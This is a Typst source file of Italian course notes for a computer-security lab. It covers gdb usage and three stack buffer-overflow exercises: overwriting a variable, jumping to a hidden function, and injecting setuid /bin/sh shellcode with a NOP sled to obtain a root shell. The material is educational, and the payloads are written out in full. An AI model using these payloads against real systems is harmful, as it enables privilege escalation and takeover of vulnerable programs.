#let title = "Sicurezza Informatica"
#let author = "Bumma Giuseppe"

#set document(title: title, author: author)


#show link: set text(rgb("#cc0052"))

#show ref: set text(green)

#set page(margin: (y: 0.5cm))

#set text(15pt)

#set heading(numbering: "1.1.1.1.1.1")
//#set math.equation(numbering: "(1)")

#set math.mat(gap: 1em)

//Code to have bigger fraction in inline math 
#let dfrac(x,y) = math.display(math.frac(x,y))

//Equation without numbering (obsolete)
#let nonum(eq) = math.equation(block: true, numbering: none, eq)
//Usage: #nonum($a^2 + b^2 = c^2$)

#let space = h(5em)

//Color
#let myblue = rgb(155, 165, 255)
#let myred = rgb(248, 136, 136)

//Shortcut for centered figure with image
#let cfigure(img, wth) = figure(image(img, width: wth))
//Usage: #cfigure("Images/Es_Rettilineo.png", 70%)

#let nfigure(img, wth) = figure(image("Images/"+img, width: wth))

#set highlight(extent: 2pt)


//Code to have sublevel equation numbering
/*#set math.equation(numbering: (..nums) => {
   locate(loc => {
      "(" + str(counter(heading).at(loc).at(0)) + "." + str(nums.pos().first()) + ")"
    })
},)
#show heading: it => {
    if it.level == 1 {
      counter(math.equation).update(0)
    }
}*/
//

//Shortcut to write equation with tag aligned to right
#let tageq(eq,tag) = grid(columns: (1fr, 1fr, 1fr), column-gutter: 1fr, [], math.equation(block: true ,numbering: none)[$eq$], align(horizon)[$tag$])
// Usage: #tageq($x=y$, $j=1,...,n$)

// Show title and author
#v(3pt, weak: true)
#align(center, text(18pt, title))
#v(8.35mm, weak: true)

#align(center, text(15pt, author))
#v(8.35mm, weak: true)



= Laboratorio

== Binary Exploit

- Comandi di `gdb`:
	- `b *FUNCTION` aggiunge un breakpoint all'inizio della funzione specificata
	- `run ARGUMENT` lancia il programma passando ARGUMENT come parametro
	- se vogliamo stampare i 200 byte successivi a un determinato registro diamo il comando `x/200xw $REGISTRO`, ad esempio `x/200xw $esp`
	- `disas FUNCTION` stampa il codice assembly risultante dalla traduzione del codice di una determinata funzione, es. `disas main`
	- `info functions` stampa gli indirizzi di tutte le funzioni caricate in memoria dal processo, tra le quali si trovano anche tutte le funzioni di librerie utilizzate dal processo
	- `info register` stampa lo stato attuale dei registri, cioè gli indirizzi che essi contengono
=== Esercizio write_var
- Utilizziamo `perl` per scrivere esattamente il numero di caratteri che vogliamo come argomento del programma con
  
  ```bash
  ./es $(perl -e 'print "A"x100') 
  ```
	- con
	  
	  ```bash
	  ./es $(perl -e 'print "A"x100,"string"') 
	  ```
	  concateniamo le due stringhe
- Con questo comando lanciamo il programma e gli diamo come argomento una stringa formata da 100 volte il carattere "A"
- Se inseriamo una stringa di 104 "A"
  
  ```bash
  ./es $(perl -e 'print "A"x104') 
  ```
  l'output risulta differente, infatti la variabile `control` nell'altro caso valeva 3039, ora invece 3000
- Se inseriamo una stringa di 108 "A" la variabile `control` diventa `41414141`, dove `41` è la lettera "A" rappresentata in codice esadecimale secondo ASCII
- Ora sappiamo che dobbiamo inserire una stringa di 108 caratteri per sovrascrivere completamente la variabile `control`
- Siccome è l'output stesso che ci dice `control must be: 0x42434445`, proviamo allora a scrivere dentro `control` questa serie di caratteri
- Siccome sono quattro caratteri, dobbiamo inserire prima 104 caratteri arbitrari, e dopo i quattro caratteri che vogliamo, ricordando però che l'architettura è Little Endian, quindi dobbiamo scrivere "al contrario", in questo modo:
  
  ```bash
  ./es $(perl -e 'print "A"x104,"\x45\x44\x43\x42"')
  ```
- E l'output infatti conferma che quella è la flag giusta
=== Esercizio secret_function
- Come prima (ma usando gdb con il comando `gdb es`), proviamo a fare un buffer overflow
- Quindi diamo il comando `run $(perl -e 'print "A"x20')`
- Con 20 caratteri il programma va già in segmentation fault
- Facendo dei tentativi vediamo che vengono scritti nell'indirizzo di ritorno i 4 caratteri dopo il 16esimo
- Ad esempio, se lanciamo
```bash
  run $(perl -e 'print "A"x16,"BBBB"')
```

- Vediamo dall'output che l'indirizzo di ritorno è stato sovrascritto, e adesso è `0x42424242`, cioè "BBBB" in esadecimale
- Ora dobbiamo scrivere al posto dell'indirizzo di ritorno l'indirizzo della funzione vulnerabile, cioè la funzione `secret`
- Con `info function` vediamo l'indirizzo della funzione `secret`, in questo caso è `0x565561b9`
- Quindi lanciamo 
  
  ```bash
  run $(perl -e 'print "A"x16,"\xb9\x61\x55\x56"')
  ```

=== Shellcode
- In questo caso, utilizzando il buffer overflow vediamo che i 4 byte dopo il 112 vengono sovrascritti nell'indirizzo di ritorno
- In questo esercizio lo shellcode è già dato (si trova nel file `shellcode.txt`)
- Se vogliamo controllare la lunghezza dello shellcode diamo
  ```bash 
  pyhton3
  >>> len(b'\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16
  \x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b
  \x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f
  \x62\x69\x6e\x2f\x73\x68')
  ```
  la `b` sta per _binary_
- Siccome la lunghezza del nostro shellcode è 46, e il buffer è di 112, riempiamo il payload di 66 caratteri NOP `\x90` all'inizio
- Ora dobbiamo capire che indirizzo di ritorno inserire nel payload; per farlo guardiamo il nostro stack con 
  ```bash 
  (gdb) x/300xw $esp
  ```
  e troviamo l'indirizzo in cui il nostro shellcode inizia, sfruttando il fatto che la parte di stack in cui è contenuto il codice del nostro shellcode è preceduta da 66 caratteri NOP (nel mio caso l'indirizzo è `ffffd210`)
  #cfigure("images/2024-04-03-19-57-21.png", 100%)
- Il comando da lanciare sarà quindi
  ```bash 
  run $(perl -e 'print "\x90"x66,"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16
  \x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d
  \x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69
  \x6e\x2f\x73\x68","\x10\xd2\xff\xff"')
  ```
- Verifichiamo che adesso si è aperta una shell, ma per avere accesso a una shell di root non possiamo lanciare il processo da `gdb` ma lanciare il binario con il path assoluto
  ```bash 
  /home/kali/lab_exercises/shellcode/es $(perl -e 'print "\x90"x66,"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16
  \x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d
  \x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69
  \x6e\x2f\x73\x68","\x10\xd2\xff\xff"')

  ```